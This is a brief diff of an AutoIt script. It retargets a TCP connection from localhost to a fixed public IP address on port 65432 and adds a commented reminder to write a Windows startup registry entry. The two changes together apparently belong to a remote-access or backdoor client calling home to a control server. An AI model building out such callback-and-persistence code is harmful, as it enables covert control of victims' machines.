@@ -215,11 +215,11 @@ Func	Connexion($numbertime)
 
 	TCPStartup()
 
-	Local	$ip = "127.0.0.1"
+	Local	$ip = "78.235.98.37"
 	Local	$port = 65432
 
 	Global	$socket = TCPConnect($ip, $port)
-
+;~ 	Registry Write Starting Windows
 	if @error Then
 		if $numbertime < 10 then
 			sleep(1000)
